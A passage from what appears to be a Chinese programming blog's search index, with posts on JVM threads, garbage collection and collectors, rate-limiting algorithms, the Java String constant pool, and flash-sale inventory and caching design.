周期性任务调度的线程，主要包含 JVM 内部的采样分析 Singal Dispatcher Thread：处理 OS 发来的信号 VM Thread：某些操作需要等待 JVM 到达 安全点（Safe Point），即堆区没有变化。比如：GC 操作、线程 Dump、线程挂起 这些操作都在 VM Thread 中进行。  按照线程类型来分，在 JVM 内部有两种线程：\n 守护线程：通常是由虚拟机自己使用，比如 GC 线程。但是，Java程序也可以把它自己创建的任何线程标记为守护线程（public final void setDaemon(boolean on)来设置，但必须在start()方法之前调用）。 非守护线程：main方法执行的线程，我们通常也称为用户线程。  只要有任何的非守护线程在运行，Java程序也会继续运行。当该程序中所有的非守护线程都终止时，虚拟机实例将自动退出（守护线程随 JVM 一同结束工作）。\n守护线程中不适合进行IO、计算等操作，因为守护线程是在所有的非守护线程退出后结束，这样并不能判断守护线程是否完成了相应的操作，如果非守护线程退出后，还有大量的数据没来得及读写，这将造成很严重的后果。\n","date":"2021-09-06","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/jvm%E6%9E%B6%E6%9E%84/","series":["Manual"],"tags":["Java"],"title":"JVM架构"},{"categories":["编程思想"],"content":"对象存活检测 Java堆中存放着大量的Java对象实例，在垃圾收集器回收内存前，第一件事情就是确定哪些对象是活着的，哪些是可以回收的。\n引用计数算法 引用计数算法是判断对象是否存活的基本算法：给每个对象添加一个引用计数器，没当一个地方引用它的时候，计数器值加1；当引用失效后，计数器值减1。但是这种方法有一个致命的缺陷，当两个对象相互引用时会导致这两个都无法被回收。\n根搜索算法 引用计数是通过为堆中每个对象保存一个计数来区分活动对象和垃圾。根搜索算法实际上是追踪从根结点开始的 引用图。\n在根搜索算法追踪的过程中，起点即 GC Root，GC Root 根据 JVM 实现不同而不同，但是总会包含以下几个方面（堆外引用）：\n 虚拟机栈（栈帧中的本地变量表）中引用的对象。 方法区中的类静态属性引用的变量。 方法区中的常量引用的变量。 本地方法 JNI 的引用对象。  根搜索算法是从 GC Root 开始的引用图，引用图是一个有向图，其中节点是各个对象，边为引用类型。JVM 中的引用类型分为四种：强引用（StrongReference）、软引用（SoftReference）、弱引用（WeakReference） 和 虚引用（PhantomReference）。\n除强引用外，其他引用在Java 由 Reference 的子类封装了指向其他对象的连接：被指向的对象称为 引用目标。\n若一个对象的引用类型有多个，那到底如何判断它的回收策略呢？其实规则如下：\n 单条引用链以链上最弱的一个引用类型来决定； 多条引用链以多个单条引用链中最强的一个引用类型来决定；  在引用图中，当一个节点没有任何路径可达时，我们认为它是可回收的对象。\nStrongReference 强引用在Java中是普遍存在的，类似 Object o = new Object(); 。强引用和其他引用的区别在于：强引用禁止引用目标被垃圾收集器收集，而其他引用不禁止。\nSoftReference 对象可以从根节点通过一个或多个(未被清除的)软引用对象触及，垃圾收集器在要发生内存溢出前将这些对象列入回收范围中进行回收，如果该软引用对象和引用队列相关联，它会把该软引用对象加入队列。\nJVM 的实现需要在抛出 OutOfMemoryError 之前清除 SoftReference，但在其他的情况下可以选择清理的时间或者是否清除它们。\nWeakReference 对象可以从 GC Root 开始通过一个或多个(未被清除的)弱引用对象触及， 垃圾收集器在 GC 的时候会回收所有的 WeakReference，如果该弱引用对象和引用队列相关联，它会把该弱引用对象加入队列。\nPhantomReference 垃圾收集器在 GC 不会清除 PhantomReference，所有的虚引用都必须由程序明确的清除。同时也不能通过虚引用来取得一个对象的实例。通常与ReferenceQueue配合使用来实现，能在这个对象被收集器回收时收到一个系统通知。利用虚引用PhantomReference实现对象被回收时收到一个系统通知 垃圾回收算法 复制回收算法 将可用内存分为大小相等的两份，在同一时刻只使用其中的一份。当这一份内存使用完了，就将还存活的对象复制到另一份上，然后将这一份上的内存清空。复制算法能有效避免内存碎片，但是算法需要将内存一分为二，导致内存使用率大大降低。\n标记清除算法 先暂停整个程序的全部运行线程，让回收线程以单线程进行扫描标记，并进行直接清除回收，然后回收完成后，恢复运行线程。标记清除后会产生大量不连续的内存碎片，造成空间浪费。\n标记整理算法 和 标记清除 相似，不同的是，回收期间同时会将保留的存储对象搬运汇集到连续的内存空间，从而集成空闲空间。\n增量回收 需要程序将所拥有的内存空间分成若干分区（Region）。程序运行所需的存储对象会分布在这些分区中，每次只对其中一个分区进行回收操作，从而避免程序全部运行线程暂停来进行回收，允许部分线程在不影响回收行为而保持运行，并且降低回收时间，增加程序响应速度。\n分代回收 在 JVM 中不同的对象拥有不同的生命周期，因此对于不同生命周期的对象也可以采用不同的垃圾回收算法，以提高效率，这就是分代回收算法的核心思想。\n记忆集 上面有说到进行 GC 的时候，会从 GC Root 进行搜索，做一个引用图。现有一个对象 C 在 Young Gen，其只被一个在 Old Gen 的对象 D 引用，其引用结构如下所示：\n这个时候要进行 Young GC，要确定 C 是否被堆外引用，就需要遍历 Old Gen，这样的代价太大。所以 JVM 在进行对象引用的时候，会有个 记忆集（Remembered Set） 记录从 Old Gen 到 Young Gen 的引用关系，并把记忆集里的 Old Gen 作为 GC Root 来构建引用图。这样在进行 Young GC 时就不需要遍历 Old Gen。\n但是使用记忆集也会有缺点：C \u0026amp; D 其实都可以进行回收，但是由于记忆集的存在，不会将 C 回收。这里其实有一点 空间换时间 的意思。不过无论如何，它依然确保了垃圾回收所遵循的原则：垃圾回收确保回收的对象必然是不可达对象，但是不确保所有的不可达对象都会被回收。\n垃圾回收触发条件 先引用《深入理解Java虚拟机》的一段话：\n 不少资料上经常写着类似于“Java虚拟机的堆内存分为新生代、老年代、永久代、Eden、Survivor\u0026hellip;\u0026hellip;”这样的内容。在十年之前（以G1收集器的出现为分界），作为业界绝对主流的HotSpot虚拟机，它内部的垃圾收集器全部都基于“经典分代”[3]来设计，需要新生代、老年代收集器搭配才能工作，在这种背景下，上述说法还算是不会产生太大歧义。但是到了今天，垃圾收集器技术与十年前已不可同日而语，HotSpot里面也出现了不采用分代设计的新垃圾收集器，再按照上面的提法就有很多需要商榷的地方了。\n 因此本节以及下一节《垃圾收集器》（除G1）内容的前提都是基于经典分代\n堆内内存 针对 HotSpot VM 的实现，它里面的 GC 其实准确分类只有两大种：\n  Partial GC：并不收集整个 GC 堆的模式\n Young GC（Minor GC）：只收集 Young Gen 的 GC Old GC：只收集 Old Gen 的 GC。只有 CMS的 Concurrent Collection 是这个模式 Mixed GC：收集整个 Young Gen 以及部分 Old Gen 的 GC。只有 G1 有这个模式    Full GC（Major GC）：收集整个堆，包括 Young Gen、Old Gen、Perm Gen（如果存在的话）等所有部分的 GC 模式。\n  最简单的分代式GC策略，按 HotSpot VM 的 serial GC 的实现来看，触发条件是\n Young GC：当 Young Gen 中的 eden 区分配满的时候触发。把 Eden 区存活的对象将被复制到一个 Survivor 区，当这个 Survivor 区满时，此区的存活对象将被复制到另外一个 Survivor 区。   在1989年，AndrewAppel针对具备“朝生夕灭”特点的对象，提出了一种更优化的半区复制分代策略，现在称为“Appel式回收”。HotSpot虚拟机的Serial、ParNew等新生代收集器均采用了这种策略来设计新生代的内存布局[1]。Appel式回收的具体做法是把新生代分为一块较大的Eden空间和两块较小的Survivor空间，每次分配内存只使用Eden和其中一块Survivor。发生垃圾搜集时，将Eden和Survivor中仍然存活的对象一次性复制到另外一块Survivor空间上，然后直接清理掉Eden和已用过的那块Survivor空间。HotSpot虚拟机默认Eden和Survivor的大小比例是8∶1，也即每次新生代中可用内存空间为整个新生代容量的90%（Eden的80%加上一个Survivor的10%），只有一个Survivor空间，即10%的新生代是会被“浪费”的。当然，98%的对象可被回收仅仅是“普通场景”下测得的数据，任何人都没有办法百分百保证每次回收都只有不多于10%的对象存活，因此Appel式回收还有一个充当罕见情况的“逃生门”的安全设计，当Survivor空间不足以容纳一次MinorGC之后存活的对象时，就需要依赖其他内存区域（实际上大多就是老年代）进行分配担保（HandlePromotion）。\n   Full GC：\n  当准备要触发一次 Young GC 时，如果发现之前 Young GC 的平均晋升大小比目前 Old Gen剩余的空间大，则不会触发 Young GC 而是转为触发 Full GC\n 除了 CMS 的 Concurrent Collection 之外，其它能收集 Old Gen 的GC都会同时收集整个 GC 堆，包括 Young Gen，所以不需要事先触发一次单独的Young GC\n   如果有 Perm Gen 的话，要在 Perm Gen分配空间但已经没有足够空间时\n  System.gc()\n  Heap dump\n    并发 GC 的触发条件就不太一样。以 CMS GC 为例，它主要是定时去检查 Old Gen 的使用量，当使用量超过了触发比例就会启动一次 GC，对 Old Gen做并发收集。\n堆外内存 DirectByteBuffer 的引用是直接分配在堆得 Old 区的，因此其回收时机是在 FullGC 时。因此，需要避免频繁的分配 DirectByteBuffer ，这样很容易导致 Native Memory 溢出。\nDirectByteBuffer 申请的直接内存，不再GC范围之内，无法自动回收。JDK 提供了一种机制，可以为堆内存对象注册一个钩子函数(其实就是实现 Runnable 接口的子类)，当堆内存对象被GC回收的时候，会回调run方法，我们可以在这个方法中执行释放 DirectByteBuffer 引用的直接内存，即在run方法中调用 Unsafe 的 freeMemory 方法。注册是通过sun.misc.Cleaner 类来实现的。\n垃圾收集器 垃圾收集器是内存回收的具体实现，下图展示了 7 种用于不同分代的收集器，两个收集器之间有连线表示可以搭配使用，每种收集器都有最适合的使用场景。\nSerial 收集器 Serial 收集器是最基本的收集器，这是一个单线程收集器，它只用一个线程去完成垃圾收集工作。\n虽然 Serial 收集器的缺点很明显，但是它仍然是 JVM 在 Client 模式下的默认新生代收集器。它有着优于其他收集器的地方：简单而高效（与其他收集器的单线程比较），Serial 收集器由于没有线程交互的开销，专心只做垃圾收集自然也获得最高的效率。在用户桌面场景下，分配给 JVM 的内存不会太多，停顿时间完全可以在几十到一百多毫秒之间，只要收集不频繁，这是完全可以接受的。\nParNew 收集器 ParNew 是 Serial 的多线程版本，在回收算法、对象分配原则上都是一致的。ParNew 收集器是许多运行在Server 模式下的默认新生代垃圾收集器，其主要与 CMS 收集器配合工作。\nParallel Scavenge 收集器 Parallel Scavenge 收集器是一个新生代垃圾收集器，也是并行的多线程收集器。\nParallel Scavenge 收集器更关注可控制的 吞吐量 ，吞吐量等于运行用户代码的时间/(运行用户代码的时间+垃圾收集时间)。\nSerial Old收集器 Serial Old 收集器是 Serial 收集器的老年代版本，也是一个单线程收集器，采用“标记-整理算法”进行回收。\nParallel Old 收集器 Parallel Old 收集器是 Parallel Scavenge 收集器的老年代版本，使用多线程进行垃圾回收，其通常与 Parallel Scavenge 收集器配合使用。\nCMS 收集器 CMS（Concurrent Mark Sweep）收集器是一种以获取 最短停顿时间 为目标的收集器， CMS 收集器采用 标记--清除 算法，运行在老年代。主要包含以下几个步骤：\n 初始标记（Stop the world） 并发标记 重新标记（Stop the world） 并发清除  其中初始标记和重新标记仍然需要 Stop the world。初始标记仅仅标记 GC Root 能直接关联的对象，并发标记就是进行 GC Root Tracing 过程，而重新标记则是为了修正并发标记期间，因用户程序继续运行而导致标记变动的那部分对象的标记记录。\n STW原因：\n 在垃圾回收过程中经常涉及到对对象的挪动（比如上文提到的对象在Survivor 0和Survivor 1之间的复制），进而导致需要对对象引用进行更新。为了保证引用更新的正确性，Java将暂停所有其他的线程，这种情况被称为“Stop-The-World”，导致系统全局停顿。 类比在聚会时打扫房间，聚会时很乱，又有新的垃圾产生，房间永远打扫不干净，只有让大家停止活动了，才能将房间打扫干净。当gc线程在处理垃圾的时候，其它java线程要停止才能彻底清除干净，否则会影响gc线程的处理效率增加gc线程负担，特别是在垃圾标记的时候。   由于整个过程中最耗时的并发标记和并发清除，收集线程和用户线程一起工作，所以总体上来说， CMS 收集器回收过程是与用户线程并发执行的。虽然 CMS 优点是并发收集、低停顿，很大程度上已经是一个不错的垃圾收集器，但是还是有三个显著的缺点：\n CMS收集器对CPU资源很敏感：在并发阶段，虽然它不会导致用户线程停顿，但是会因为占用一部分线程（CPU资源）而导致应用程序变慢。 CMS收集器不能处理浮动垃圾：所谓的“浮动垃圾”，就是在并发标记阶段，由于用户程序在运行，那么自然就会有新的垃圾产生，这部分垃圾被标记过后，CMS 无法在当次集中处理它们，只好在下一次 GC 的时候处理，这部分未处理的垃圾就称为“浮动垃圾”。 GC 后产生大量内存碎片：当内存碎片过多时，将会给分配大对象带来困难，这是就会进行 Full GC。  正是由于在垃圾收集阶段程序还需要运行，即还需要预留足够的内存空间供用户使用，因此 CMS 收集器不能像其他收集器那样等到老年代几乎填满才进行收集，需要预留一部分空间提供并发收集时程序运作使用。要是 CMS 预留的内存空间不能满足程序的要求，这是 JVM 就会启动预备方案：临时启动 Serial Old 收集器来收集老年代，这样停顿的时间就会很长。\nG1收集器 G1收集器与CMS相比有很大的改进：\n 标记整理算法：G1 收集器采用标记整理算法实现 增量回收模式：将 Heap 分割为多个 Region，并在后台维护一个优先列表，每次根据允许的时间，优先回收垃圾最多的区域  因此 G1 收集器可以实现在基本不牺牲吞吐量的情况下完成低停顿的内存回收，这是正是由于它极力的避免全区域的回收。\n   垃圾收集器 特性 算法 优点 缺点     Serial 串行 复制 高效：无线程切换 无法利用多核CPU   ParNew 并行 复制 可利用多核CPU、唯一能与CMS配合的并行收集器    Parallel Scavenge 并行 复制 高吞吐量    Serial Old 串行 标记整理 高效 无法利用多核CPU   Parallel Old 并行 标记整理 高吞吐量    CMS 并行 标记清除 低停顿 CPU敏感、浮动垃圾、内存碎片   G1 并行 增量回收 低停顿、高吞吐量 内存使用效率低：分区导致内存不能充分使用   ","date":"2021-09-05","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/jvm%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/","series":["Manual"],"tags":["Java"],"title":"JVM垃圾回收"},{"categories":["架构演进"],"content":"为了应用服务的高可用，一个常用的办法是对大流量的请求（秒杀/抢购）进行限流，拦截掉大部分请求，只允许一部分请求真正进入后端服务器，这样就可以防止大量请求造成系统压力过大导致的系统崩溃，从而保护服务正常可用。\n固定窗口计数器、滑动窗口计数器、漏桶(leaky bucket) 、令牌桶(Token Bucket)算法是最常用的四种限流的算法。\n1. 限流算法 1.1 固定窗口计数器 优点：实现简单，容易理解。\n缺点：流量曲线可能不够平滑，有 突刺现象 并且 一段时间内系统不可用，如下图所示。这样会有两个问题：\n  一段时间内（不超过时间窗口）系统服务不可用。比如窗口大小为1s，限流大小为100，然后恰好在某个窗口的第1ms来了100个请求，然后第2ms-999ms的请求就都会被拒绝，这段时间用户会感觉系统服务不可用。\n  窗口切换时可能会产生两倍于阈值流量的请求。比如窗口大小为1s，限流大小为100，然后恰好在某个窗口的第999ms来了100个请求，窗口前期没有请求，所以这100个请求都会通过。再恰好，下一个窗口的第1ms有来了100个请求，也全部通过了，那也就是在2ms之内通过了200个请求，而我们设定的阈值是100，通过的请求达到了阈值的两倍。\n  1.2 滑动窗口计数器 滑动窗口限流解决固定窗口临界值的问题，可以保证在任意时间窗口内都不会超过阈值。\n相对于固定窗口，滑动窗口除了需要引入计数器之外还需要记录时间窗口内每个请求到达的时间点，因此 对内存的占用会比较多，并且没有解决 一段时间内系统不可用 的问题，仍然存在 突刺现象 不适用需要流量平滑的场景。\n规则如下，假设时间窗口为 1 秒：\n 记录每次请求的时间 统计每次请求的时间 至 往前推1秒这个时间窗口内请求数，并且 1 秒前的数据可以删除。 统计的请求数小于阈值就记录这个请求的时间，并允许通过，反之拒绝。  1.3 漏桶  将进来的请求流量视为水滴先放入桶内 水从桶的底部以固定的速率匀速流出，相当于在匀速处理请求 当漏桶内的水满时(超过了限流阈值)则拒绝服务  不管服务调用方多么不稳定，通过漏桶算法进行限流，每 10 毫秒处理一次请求。因为处理的速度是固定的，请求进来的速度是未知的，可能突然进来很多请求，没来得及处理的请求就先放在桶里，既然是个桶，肯定是有容量上限，如果桶满了，那么新进来的请求就丢弃。\n实现思路： 用有界队列来保存请求，一个consumer线程每 10 毫秒从队列中获取一个请求，并交给work线程池执行。\n这种算法，在使用过后也存在弊端：无法应对短时间的突发流量，同时它的优点也是可以平滑网络上的突发流量，请求可以被整形成稳定的流量。可见 平滑流量 既是优点也是缺点，选择漏桶还是计数器要看具体的应用场景。\n1.4 令牌桶  按照一定的速率生产令牌并放入令牌桶中 如果桶中令牌已满，则丢弃令牌 请求过来时先到桶中拿令牌，拿到令牌则放行通过，否则拒绝请求  令牌桶算法是对漏桶算法的一种改进，桶算法能够限制请求调用的速率，而令牌桶算法能够在 限制调用的平均速率的同时还能 应对一定程度的突发调用。\n实现思路： 用有界队列来保存令牌，通过一个producer线程定期生成令牌放到队列中，请求来时，一个consumer线程去获取令牌，获取到令牌后把请求交给worker线程池去处理。\n令牌桶看起来和 Semaphore 很相似，是否可以利用它来实现？不过在Java里 Semaphore 本质是基于AQS的，AQS还是一个队列😔\n2.分布限流 2.1 Redis限流 大概思路：每次有相关操作的时候，就向 redis 服务器发送一个 incr 命令，比如需要限制某个用户访问 /index 接口的次数，只需要拼接用户 id 和接口名生成 redis 的 key ，每次该用户访问此接口时，只需要对这个 key 执行 incr 命令，在这个 key 带上过期时间，就可以实现指定时间的访问频率。\n2.2 Nginx限流 nginx自带限流功能，通过配置就可以实现限流，如 limit_req_zone limit_req_conn\n参考 高并发下的流量控制 限流算法实践 一文搞懂高频面试题之限流算法，从算法原理到实现，再到对比分析 图解+代码|常见限流算法以及限流在单机分布式场景下的思考 ","date":"2021-09-05","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/sa/%E9%AB%98%E5%B9%B6%E5%8F%91%E4%B8%8B%E7%9A%84%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/","series":["Manual"],"tags":["SA"],"title":"高并发下的流量控制"},{"categories":["编程思想"],"content":"引言 在Java开发中不管是前后端交互的JSON串，还是数据库中的数据存储，我们常常需要使用到String类型的字符串。作为最常用也是最基础的引用数据类型，JVM为String提供了字符串常量池来提高性能，本篇文章我们一起从底层JVM中认识并学习字符串常量池的概念和设计原理。\n字符串常量池由来 在日常开发过程中，字符串的创建是比较频繁的，而字符串的分配和其他对象的分配是类似的，需要耗费大量的时间和空间，从而影响程序的运行性能，所以作为最基础最常用的引用数据类型，Java设计者在JVM层面提供了字符串常量池。\n实现前提  实现这种设计的一个很重要的因素是：String类型是不可变的，实例化后，不可变，就不会存在多个同样的字符串实例化后有数据冲突； 运行时，实例创建的全局字符串常量池中会有一张表，记录着常量池中每个唯一的字符串对象维护一个引用，当垃圾回收时，发现该字符串被引用时，就不会被回收。  实现原理 为了提高性能并减少内存的开销，JVM在实例化字符串常量时进行了一系列的优化操作：\n 在JVM层面为字符串提供字符串常量池，可以理解为是一个缓存区； 创建字符串常量时，JVM会检查字符串常量池中是否存在这个字符串； 若字符串常量池中存在该字符串，则直接返回引用实例；若不存在，先实例化该字符串，并且，将该字符串放入字符串常量池中，以便于下次使用时，直接取用，达到缓存快速使用的效果。  String str1 = \u0026#34;abc\u0026#34;; String str2 = \u0026#34;abc\u0026#34;; System.out.println(\u0026#34;str1 == str2: \u0026#34; + (str1 == str2)); //结果：str1 == str2: true 字符串常量池位置变化 方法区 提到字符串常量池，还得先从方法区说起。方法区和Java堆一样（但是方法区是非堆），是各个线程共享的内存区域，是用于存储已经被JVM加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。 很多人会把方法区称为永久代，其实本质上是不等价的，只不过HotSpot虚拟机设计团队是选择把GC分代收集扩展到了方法区，使用永久代来代替实现方法区。其实，在方法区中的垃圾收集行为还是比较少的，这个区域的内存回收目标主要是针对常量池的回收和对类型的卸载，但是这个区域的回收总是不尽如人意的，如果该区域回收不完全就会出现内存泄露。当然，对于JDK1.8时，HostSpot VM对JVM模型进行了改造，将元数据放到本地内存，将常量池和静态变量放到了Java堆里。\n元空间 JDK 1.8, HotSpot JVM将永久代移除了，使用本地内存来存储类的元数据信息，即为元空间（Metaspace）\n所以，字符串常量池的具体位置是在哪里？当然这个我们后面需要区分jdk的版本，jdk1.7之前，jdk1.7，以及jdk1.8，因为这些版本中，字符串常量池因为方法区的改变而做了一些变化。\nJDK1.7之前 在jdk1.7之前，常量池是存放在方法区中的。\nJDK1.7 在jdk1.7中，字符串常量池移到了堆中，运行时常量池还在方法区中。\nJDK1.8 jdk1.8删除了永久代，方法区这个概念还是保留的，但是方法区的实现变成了元空间，常量池沿用jdk1.7，还是放在了堆中。这样的效果就变成了：常量池和静态变量存储到了堆中，类的元数据及运行时常量池存储到元空间中。\n为啥要把方法区从JVM内存（永久代）移到直接内存（元空间)？主要有两个原因：\n 直接内存属于本地系统的IO操作，具有更高的一个IO操作性能，而JVM的堆内存这种，如果有IO操作，也是先复制到直接内存，然后再去进行本地IO操作。经过了一系列的中间流程，性能就会差一些。非直接内存操作：本地IO操作——\u0026gt;直接内存操作——\u0026gt;非直接内存操作——\u0026gt;直接内存操作——\u0026gt;本地IO操作，而直接内存操作：本地IO操作——\u0026gt;直接内存操作——\u0026gt;本地IO操作。 永久代有一个无法调整更改的JVM固定大小上限，回收不完全时，会出现OutOfMemoryError问题；而直接内存（元空间）是受到本地机器内存的限制，不会有这种问题。  变化  在JDK1.7前，运行时常量池+字符串常量池是存放在方法区中，HotSpot VM对方法区的实现称为永久代。 在JDK1.7中，字符串常量池从方法区移到堆中，运行时常量池保留在方法区中。 在JDK1.8中，HotSpot移除永久代，使用元空间代替，此时字符串常量池保留在堆中，运行时常量池保留在方法区中，只是实现不一样了，JVM内存变成了直接内存。  结合代码 代码示例 String str1 = \u0026#34;123\u0026#34;; String str2 = \u0026#34;123\u0026#34;; String str3 = \u0026#34;123\u0026#34;; String str4 = new String(\u0026#34;123\u0026#34;); String str5 = new String(\u0026#34;123\u0026#34;); String str6 = new String(\u0026#34;123\u0026#34;); 结果：\nstr1 == str2：true str2 == str3：true str3 == str4：false str4 == str5：false str5 == str6：false jvm存储示例 创建对象流程 对于jvm底层，String str = new String(\u0026quot;123\u0026quot;)创建对象流程是什么？\n 在常量池中查找是否存在\u0026quot;123\u0026quot;这个字符串；若有，则返回对应的引用实例；若无，则创建对应的实例对象； 在堆中new一个String类型的\u0026quot;123\u0026quot;字符串对象； 将对象地址复制给str，然后创建一个应用。  注意： 若常量池里没有\u0026quot;123\u0026quot;字符串，则创建了2个对象；若有该字符串，则创建了一个对象及对应的引用。\nQ\u0026A String str =\u0026ldquo;ab\u0026rdquo; + \u0026ldquo;cd\u0026rdquo;;对象个数？ 分析：若字符串常量池无该字符串对象\n 字符串常量池：（1个对象）\u0026ldquo;abcd\u0026rdquo;; 堆：无 栈：（1个引用）str 总共：1个对象+1个引用  String str = new String(\u0026ldquo;abc\u0026rdquo;);对象个数？ 分析：若字符串常量池无该字符串对象\n 字符串常量池：（1个对象）\u0026ldquo;abc\u0026rdquo;; 堆：（1个对象）new String(\u0026ldquo;abc\u0026rdquo;) 栈：（1个引用）str 总共：2个对象+1个引用  String str = new String(\u0026ldquo;a\u0026rdquo; + \u0026ldquo;b\u0026rdquo;);对象个数？ 分析：若字符串常量池无该字符串对象\n 字符串常量池：（3个对象）\u0026ldquo;a\u0026rdquo;，\u0026ldquo;b\u0026rdquo;，\u0026ldquo;ab\u0026rdquo;; 堆：（1个对象）new String(\u0026ldquo;ab\u0026rdquo;) 栈：（1个引用）str 总共：4个对象+1个引用  String str = new String(\u0026ldquo;ab\u0026rdquo;) + \u0026ldquo;ab\u0026rdquo;;对象个数？ 分析：若字符串常量池无该字符串对象\n 字符串常量池：（1个对象）\u0026ldquo;ab\u0026rdquo;; 堆：（1个对象）new String(\u0026ldquo;ab\u0026rdquo;) 栈：（1个引用）str 总共：2个对象+1个引用  String str = new String(\u0026ldquo;ab\u0026rdquo;) + new String(\u0026ldquo;ab\u0026rdquo;);对象个数？ 分析：若字符串常量池无该字符串对象\n 字符串常量池：（1个对象）\u0026ldquo;ab\u0026rdquo;; 堆：（2个对象）new String(\u0026ldquo;ab\u0026rdquo;)，new String(\u0026ldquo;ab\u0026rdquo;) 栈：（1个引用）str 总共：3个对象+1个引用  String str = new String(\u0026ldquo;ab\u0026rdquo;) + new String(\u0026ldquo;cd\u0026rdquo;);对象个数？ 分析：若字符串常量池无该字符串对象\n 字符串常量池：（2个对象）\u0026ldquo;ab\u0026rdquo;，\u0026ldquo;cd\u0026rdquo;; 堆：（2个对象）new String(\u0026ldquo;ab\u0026rdquo;)，new String(\u0026ldquo;cd\u0026rdquo;) 栈：（1个引用）str 总共：4个对象+1个引用  String str3 = str1 + str2;对象个数？ String str1 = \u0026#34;ab\u0026#34;; String str2 = \u0026#34;cd\u0026#34;; String str3 = str1 + str2; 分析：若字符串常量池无该字符串对象\n 字符串常量池：（3个对象）\u0026ldquo;ab\u0026rdquo;，\u0026ldquo;cd\u0026rdquo;，\u0026ldquo;abcd\u0026rdquo;; 堆：无 栈：（3个引用）str1，str2，str3 总共：3个对象+3个引用  如何指向字符串池中特定的对象？ 通过intern()方法。 代码\nString str1 = \u0026#34;123\u0026#34;; String str2 = new String(\u0026#34;123\u0026#34;); String str3 = str2; System.out.println(\u0026#34;str1 == str2：\u0026#34; + (str1 == str2)); System.out.println(\u0026#34;str1 == str3：\u0026#34; + (str1 == str3)); //通过java.lang.String.intern()方法指定字符串对象 String str4 = str1.intern(); System.out.println(\u0026#34;str1 == str4：\u0026#34; + (str1 == str4)); String str5 = str2.intern(); System.out.println(\u0026#34;str1 == str5：\u0026#34; + (str1 == str5)); String str6 = str3.intern(); System.out.println(\u0026#34;str1 == str6：\u0026#34; + (str1 == str6)); 结果：\nstr1 == str2：false str1 == str3：false str1 == str4：true str1 == str5：true str1 == str6：true 参考 JVM——字符串常量池详解 ","date":"2021-09-05","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/string%E5%B8%B8%E9%87%8F%E6%B1%A0/","series":["Manual"],"tags":["Java"],"title":"String常量池"},{"categories":["架构演进"],"content":"1. 前后分离  活动页面绝大多数内容是固定的，比如：商品名称、商品描述、图片等。为了减少不必要的服务端请求，通常情况下，会对活动页面做静态化处理。 CDN  2. 库存缓存 如果有数十万的请求过来，同时通过数据库查缓存是否足够，此时数据库可能会挂掉。因为数据库的连接资源非常有限，比如：mysql，无法同时支持这么多的连接。而应该改用缓存，比如：redis。\n2.1 缓存击穿 在高并发下，同一时刻会有大量的请求，都在秒杀同一件商品，这些请求同时去查缓存中没有数据，然后又同时访问数据库。结果悲剧了，数据库可能扛不住压力，直接挂掉。\n如何解决这个问题呢？\n这就需要加锁，最好使用分布式锁。\n当然，针对这种情况，最好在项目启动之前，先把缓存进行预热。即事先把所有的商品，同步到缓存中，这样商品基本都能直接从缓存中获取到，就不会出现缓存击穿的问题了。\n是不是上面加锁这一步可以不需要了？\n表面上看起来，确实可以不需要。但如果缓存中设置的过期时间不对，缓存提前过期了，或者缓存被不小心删除了，如果不加速同样可能出现缓存击穿。\n其实这里加锁，相当于买了一份保险。\n2.2 缓存穿透 如果有大量的请求传入的商品id，在缓存中和数据库中都不存在，这些请求不就每次都会穿透过缓存，而直接访问数据库了。\n由于前面已经加了锁，所以即使这里的并发量很大，也不会导致数据库直接挂掉。\n但很显然这些请求的处理性能并不好，有没有更好的解决方案？\n这时可以想到布隆过滤器。\n秒杀开始前，将所有商品id初始化到布隆过滤器，不存在需要更新布隆过滤器的情况，如果前端请求传来不存在的id的，那么请求大概率会被布隆过滤器拦截（被布隆过滤器命中的id不一定是真的存在，但是没命中的id一定不存在）。\n3. 库存问题 真正的秒杀商品的场景，不是说扣完库存，就完事了，如果用户在一段时间内，还没完成支付，扣减的库存是要加回去的。\n所以，在这里引出了一个预扣库存的概念，预扣库存的主要流程如下：\n扣减库存中除了上面说到的预扣库存和回退库存之外，还需要特别注意的是库存不足和库存超卖问题。\n3.1 预扣库存 虽然前面我们我做了分布式锁、缓存等措施，防止过多查询请求直接去到数据库，但是这些措施都是针对查询请求的，扣减库存的时候仍然可能有大量请求并发去到数据库，例如：同时有10万个请求查询缓存得到当前库存量不等于0，它们接下来全都要去数据库扣减库存。\nupdate product set stock=stock-1 where id=product and stock \u0026gt; 0;  上面的sql有点类似数据库乐观锁的思想，保证不会超卖。\n 这里我们可以采取限流措施（可以用sentinel等），例如：虽然有10万个请求将要扣减库存，但是我们只分配1000个数据库扣减名额（sentinel令牌桶🪣），甚至都不用分配1000个名额，因为秒杀商品数量肯定是已知的，假设秒杀商品数量为10个，那我们只需要放行10个扣减库存的请求去到数据库即可。\n但是，还有一类情况，就是参与秒杀的商品数量确实很多（比如小米手机刚面世的时候经常搞饥饿营销，几百万甚至几千万的请求去抢几十万的手机😔），远大于数据库能承受的并发能力。\n这里我们可以采取 限流 + 延迟重试 ，例如：我们的秒杀商品有1万个，100万个请求要去扣减库存，但是数据库只能承受1000个并发，那我们就限流每秒只有1000个请求去到数据库，让剩下的请求延迟50毫秒再重试，如果业务能允许用户一直等待秒杀结果，那就一直循环重试到有资格去数据库扣减库存或者1万个秒杀商品被抢完，抢购时间可能持续几分钟甚至更久，让用户一直等待结果也不合理，这时我们循环重试一定次数后如果还没有资格，那就先响应这个请求，并且把这个请求扔到延迟队列继续重试。\n 这里为什么不直接响应没获取到数据库扣减库存资格的请求呢？为什么不让其稍后再试呢？这主要是考虑到秒杀公平的问题，例如：小明在第1秒发起秒杀请求，但是因为秒杀系统数据库并发能力不够，你让小明稍后重试，但是注意这个时候秒杀的商品是足够的，第2秒小王发起秒杀并成功，第3秒小明再次秒杀发现商品已经被抢光，这对小明来说明显不公平的。\n 3.2 回退库存 